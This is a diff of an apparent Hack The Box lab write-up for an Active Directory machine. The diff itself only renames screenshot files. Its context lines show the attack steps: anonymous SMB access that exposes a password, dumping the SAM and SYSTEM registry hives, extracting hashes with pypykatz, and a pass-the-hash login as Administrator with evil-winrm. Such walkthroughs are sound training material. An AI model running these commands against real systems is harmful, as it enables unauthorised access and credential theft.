@@ -14,7 +14,7 @@ Start with Nmap Scan
 nmap -Pn -A -p- 10.10.11.35
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This seems to be an Active Directory box.
 
@@ -28,7 +28,7 @@ I started by enumerating SMB to see what access is available for guest/anonymous
 smbmap -H 10.10.11.35 -u 'anonymous'
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 First, I tried accessing each share. Using smbclient, I was able to access the HR share.
 
@@ -36,11 +36,11 @@ First, I tried accessing each share. Using smbclient, I was able to access the H
 smbclient \\\\10.10.11.35\\HR -U "anonymous"
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 "I used the `get` command in smbclient to transfer the 'Notice from HR.txt' file, which revealed a password."
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now that we have a password, let's see if any users are using it.
 
@@ -158,7 +158,7 @@ reg save HKLM\SAM C:\Users\emily.oscar.CICADA\Videos\sam
 reg save HKLM\SYSTEM C:\Users\emily.oscar.CICADA\Videos\system
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Download the files to your local machine, then use `pypykatz` to extract the hashes.
 
@@ -168,7 +168,7 @@ Using this command:
 pypykatz registry --sam sam system
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 With the extracted hash, we can now log in again. Instead of using the password, we'll use the `-H` option to authenticate with the hash.
 
@@ -180,7 +180,7 @@ Using this command:&#x20;
 evil-winrm -i 10.10.11.35  -u 'Administrator' -H 'hash'
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Logged in as the Administrator using the hash, located the `root.flag` file, and displayed its contents with `cat`. Challenge complete!
 
